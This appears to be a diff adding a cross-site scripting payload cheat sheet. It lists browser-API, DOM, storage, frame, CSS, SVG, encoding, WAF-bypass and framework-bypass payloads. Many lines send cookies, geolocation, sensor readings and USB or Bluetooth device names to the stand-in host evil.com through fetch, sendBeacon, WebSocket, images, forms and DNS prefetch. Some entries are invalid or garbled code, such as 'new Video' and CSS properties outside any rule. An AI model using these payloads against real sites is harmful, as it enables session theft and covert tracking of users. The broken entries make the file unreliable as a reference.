@@ -1,0 +1,376 @@
+# Advanced Browser API Exploitation
+<script>
+// Clipboard API Exploitation
+navigator.clipboard.writeText('malicious').then(()=>
+  navigator.clipboard.readText().then(eval)
+);
+
+// Service Worker Exploitation
+navigator.serviceWorker.register('javascript:alert(1)');
+navigator.serviceWorker.register(URL.createObjectURL(new Blob(['importScripts("https://evil.com")'])));
+
+// Push API Exploitation
+Notification.requestPermission().then(p=>{
+  new PushManager().subscribe({applicationServerKey:'key'}).then(s=>
+    fetch('https://evil.com',{method:'POST',body:s})
+  )
+});
+
+// Ambient Light Sensor
+const sensor = new AmbientLightSensor();
+sensor.onreading = () => location='https://evil.com/'+sensor.illuminance;
+sensor.start();
+
+// Battery Status
+navigator.getBattery().then(b=>
+  b.addEventListener('levelchange',()=>
+    fetch('https://evil.com/battery='+b.level)
+  )
+);
+
+// Geolocation Tracking
+navigator.geolocation.watchPosition(
+  p=>fetch('https://evil.com/loc='+p.coords.latitude+','+p.coords.longitude)
+);
+
+// Device Motion/Orientation
+window.addEventListener('devicemotion',e=>
+  fetch('https://evil.com/motion='+JSON.stringify(e.acceleration))
+);
+window.addEventListener('deviceorientation',e=>
+  fetch('https://evil.com/orient='+JSON.stringify({alpha:e.alpha,beta:e.beta,gamma:e.gamma}))
+);
+
+// Network Information
+navigator.connection.addEventListener('change',()=>
+  fetch('https://evil.com/net='+navigator.connection.effectiveType)
+);
+
+// USB Device Access
+navigator.usb.requestDevice({filters:[]}).then(d=>
+  fetch('https://evil.com/usb='+d.productName)
+);
+
+// Bluetooth Device Scanning
+navigator.bluetooth.requestDevice({acceptAllDevices:true}).then(d=>
+  fetch('https://evil.com/bt='+d.name)
+);
+
+// WebRTC Connection Hijacking
+new RTCPeerConnection().createDataChannel('').send(document.cookie);
+</script>
+
+# Advanced DOM Manipulation
+<script>
+// Shadow DOM Exploitation
+const shadow = document.createElement('div').attachShadow({mode:'open'});
+shadow.innerHTML='<script>alert(1)<\/script>';
+document.body.appendChild(shadow.host);
+
+// Custom Elements
+class XSSElement extends HTMLElement {
+  constructor() {
+    super();
+    eval(this.getAttribute('payload'));
+  }
+}
+customElements.define('xss-elem', XSSElement);
+<xss-elem payload="alert(1)"></xss-elem>
+
+// Mutation Observer
+new MutationObserver(m=>m.forEach(m=>
+  m.addedNodes.forEach(n=>
+    n.nodeType===1&&eval(n.getAttribute('payload'))
+  )
+)).observe(document,{childList:true,subtree:true});
+
+// Intersection Observer
+new IntersectionObserver(e=>
+  e.forEach(e=>e.isIntersecting&&eval(e.target.getAttribute('payload')))
+).observe(document.body);
+
+// Resize Observer
+new ResizeObserver(e=>
+  e.forEach(e=>eval(e.target.getAttribute('payload')))
+).observe(document.body);
+</script>
+
+# Advanced Storage Attacks
+<script>
+// LocalStorage Poisoning
+for(let i=0;i<localStorage.length;i++) {
+  let key = localStorage.key(i);
+  localStorage.setItem(key, '<img src=x onerror=alert(1)>');
+}
+
+// SessionStorage Manipulation
+for(let i=0;i<sessionStorage.length;i++) {
+  let key = sessionStorage.key(i);
+  sessionStorage.setItem(key, '<script>alert(1)<\/script>');
+}
+
+// IndexedDB Exploitation
+let req = indexedDB.open('xss',1);
+req.onupgradeneeded = e => {
+  let db = e.target.result;
+  let store = db.createObjectStore('store');
+  store.add('<script>alert(1)<\/script>', 'key');
+};
+
+// Cache Storage Poisoning
+caches.open('xss').then(cache =>
+  cache.put('/', new Response('<script>alert(1)<\/script>'))
+);
+
+// Cookie Manipulation
+document.cookie='session=<script>alert(1)<\/script>';
+</script>
+
+# Advanced IndexedDB Exploitation
+<script>
+let db = indexedDB.open('xss', 1);
+db.onupgradeneeded = e => {
+  let store = e.target.result.createObjectStore('store');
+  store.put('<script>alert(1)</script>', 'key');
+};
+db.onsuccess = e => {
+  let tx = e.target.result.transaction('store', 'readwrite');
+  tx.objectStore('store').get('key').onsuccess = e => eval(e.target.result);
+};
+</script>
+
+# Advanced Cache Poisoning
+<script>
+caches.open('xss').then(cache => {
+  cache.put('/evil', new Response('<script>alert(1)</script>'));
+  cache.match('/evil').then(res => res.text().then(eval));
+});
+</script>
+
+# Advanced Frame Manipulation
+<script>
+// Frame Navigation
+frames[0].location='javascript:alert(1)';
+top.location='javascript:alert(1)';
+parent.location='javascript:alert(1)';
+
+// Frame Message Passing
+window.addEventListener('message',e=>eval(e.data));
+window.postMessage('alert(1)','*');
+
+// Frame Content Manipulation
+frames[0].document.write('<script>alert(1)<\/script>');
+parent.document.write('<script>alert(1)<\/script>');
+</script>
+
+# Advanced Event Stream Manipulation
+<script>
+// EventSource Exploitation
+new EventSource('data:,alert(1)');
+new EventSource('javascript:alert(1)');
+
+// WebSocket Exploitation
+new WebSocket('ws://evil.com');
+new WebSocket('javascript:alert(1)');
+</script>
+
+# Advanced Worker Exploitation
+<script>
+// Web Worker
+new Worker(URL.createObjectURL(new Blob(['self.onmessage=e=>eval(e.data)'])));
+
+// Shared Worker
+new SharedWorker(URL.createObjectURL(new Blob(['onconnect=e=>e.ports[0].postMessage(eval(e.data))'])));
+
+// Service Worker
+navigator.serviceWorker.register(URL.createObjectURL(new Blob(['self.oninstall=e=>eval(e.data)'])));
+</script>
+
+# Advanced CSS Injection
+<style>
+@import 'javascript:alert(1)';
+@import url('javascript:alert(1)');
+background-image: url('javascript:alert(1)');
+list-style-image: url('javascript:alert(1)');
+content: url('javascript:alert(1)');
+cursor: url('javascript:alert(1)');
+border-image: url('javascript:alert(1)');
+</style>
+
+# Advanced SVG Exploitation
+<svg>
+<script>alert(1)</script>
+<use href="data:image/svg+xml,<svg id='x'><script>alert(1)</script></svg>#x"></use>
+<animation xlink:href="javascript:alert(1)"/>
+<image href="javascript:alert(1)"/>
+<foreignObject requiredExtensions="javascript:alert(1)"/>
+</svg>
+
+# Advanced Protocol Handler Exploitation
+<a href="javascript:alert(1)">Click</a>
+<a href="data:text/html,<script>alert(1)</script>">Click</a>
+<a href="vbscript:alert(1)">Click</a>
+<a href="view-source:javascript:alert(1)">Click</a>
+<a href="jar:javascript:alert(1)">Click</a>
+<a href="java:javascript:alert(1)">Click</a>
+<a href="mailto:javascript:alert(1)">Click</a>
+<a href="tel:javascript:alert(1)">Click</a>
+
+# Advanced Encoding Techniques
+<script>
+eval('\x61\x6c\x65\x72\x74\x28\x31\x29'); // Hex
+eval('\141\154\145\162\164\50\61\51'); // Octal
+eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029'); // Unicode
+eval(atob('YWxlcnQoMSk=')); // Base64
+eval(decodeURIComponent('alert%281%29')); // URL
+</script>
+
+# Advanced Template Injection
+<script>
+`${alert(1)}`;
+`${eval('alert(1)')}`;
+String.raw`${alert(1)}`;
+</script>
+
+# Advanced Proxy Object Exploitation
+<script>
+new Proxy({}, {
+  get: () => alert(1),
+  set: () => alert(1),
+  has: () => alert(1),
+  deleteProperty: () => alert(1),
+  apply: () => alert(1),
+  construct: () => alert(1),
+  defineProperty: () => alert(1),
+  getOwnPropertyDescriptor: () => alert(1),
+  getPrototypeOf: () => alert(1),
+  setPrototypeOf: () => alert(1),
+  isExtensible: () => alert(1),
+  preventExtensions: () => alert(1),
+  ownKeys: () => alert(1)
+});
+</script>
+
+# Advanced Error-Based Execution
+<script>
+window.onerror = alert;
+window.onunhandledrejection = e => alert(e.reason);
+throw 1;
+Promise.reject(2);
+new Promise((r,j) => j(3));
+</script>
+
+# Advanced Promise-Based Execution
+<script>
+Promise.reject(alert(1));
+new Promise(r => r(alert(1)));
+Promise.all([Promise.resolve(alert(1))]);
+Promise.race([Promise.resolve(alert(1))]);
+Promise.any([Promise.resolve(alert(1))]);
+Promise.allSettled([Promise.resolve(alert(1))]);
+</script>
+
+# Advanced Browser Extension Communication
+<script>
+window.postMessage({type:'extension',eval:'alert(1)'},'*');
+chrome.runtime.sendMessage({eval:'alert(1)'});
+browser.runtime.sendMessage({eval:'alert(1)'});
+safari.extension.dispatchMessage('alert(1)');
+</script>
+
+# Advanced Data Exfiltration Techniques
+<script>
+// Beacon API
+navigator.sendBeacon('https://evil.com',document.cookie);
+
+// Fetch API with Credentials
+fetch('https://evil.com',{
+  method:'POST',
+  credentials:'include',
+  body:document.cookie
+});
+
+// WebSocket Data Exfiltration
+new WebSocket('wss://evil.com').send(document.cookie);
+
+// Image-based Exfiltration
+new Image().src='https://evil.com/?'+document.cookie;
+
+// Audio/Video-based Exfiltration
+new Audio('https://evil.com/?'+document.cookie);
+new Video('https://evil.com/?'+document.cookie);
+
+// Form-based Exfiltration
+let f=document.createElement('form');
+f.action='https://evil.com';
+f.method='POST';
+let i=document.createElement('input');
+i.name='data';
+i.value=document.cookie;
+f.appendChild(i);
+f.submit();
+
+// XMLHttpRequest Exfiltration
+let x=new XMLHttpRequest();
+x.open('POST','https://evil.com');
+x.send(document.cookie);
+
+// WebRTC Data Channel Exfiltration
+let pc=new RTCPeerConnection();
+pc.createDataChannel('').send(document.cookie);
+
+// DNS Prefetch Exfiltration
+let l=document.createElement('link');
+l.rel='dns-prefetch';
+l.href='https://'+document.cookie+'.evil.com';
+document.head.appendChild(l);
+
+// Resource Timing API Exfiltration
+performance.setResourceTimingBufferSize(1000000);
+fetch('https://evil.com/?'+performance.getEntriesByType('resource').map(e=>e.name).join(','));
+</script>
+
+# Advanced WAF Bypass Techniques
+<<script>alert(1)//
+<script\x20type="text/javascript">javascript:alert(1);</script>
+<script\x3Etype="text/javascript">javascript:alert(1);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<script\x09type="text/javascript">javascript:alert(1);</script>
+<script\x0Ctype="text/javascript">javascript:alert(1);</script>
+<script\x2Ftype="text/javascript">javascript:alert(1);</script>
+<script\x0Atype="text/javascript">javascript:alert(1);</script>
+
+# Advanced Framework Bypass Techniques
+// AngularJS
+{{constructor.constructor('alert(1)')()}}
+{{$eval('alert(1)')}}
+{{$eval.constructor('alert(1)')()}}
+
+// React
+<div dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}></div>
+
+// Vue.js
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+
+// Ember.js
+{{{htmlSafe "<img src=x onerror=alert(1)>"}}}
+
+# Advanced WebRTC Exploitation
+<script>
+let pc = new RTCPeerConnection();
+pc.createDataChannel('xss').send('<script>alert(1)</script>');
+</script>
+
+# Advanced WebUSB Exploitation
+<script>
+navigator.usb.requestDevice({filters: []}).then(device => {
+  alert('USB Device: ' + device.productName);
+});
+</script>
+
+# Advanced Web Bluetooth Exploitation
+<script>
+navigator.bluetooth.requestDevice({acceptAllDevices: true}).then(device => {
+  alert('Bluetooth Device: ' + device.name);
+});
+</script>
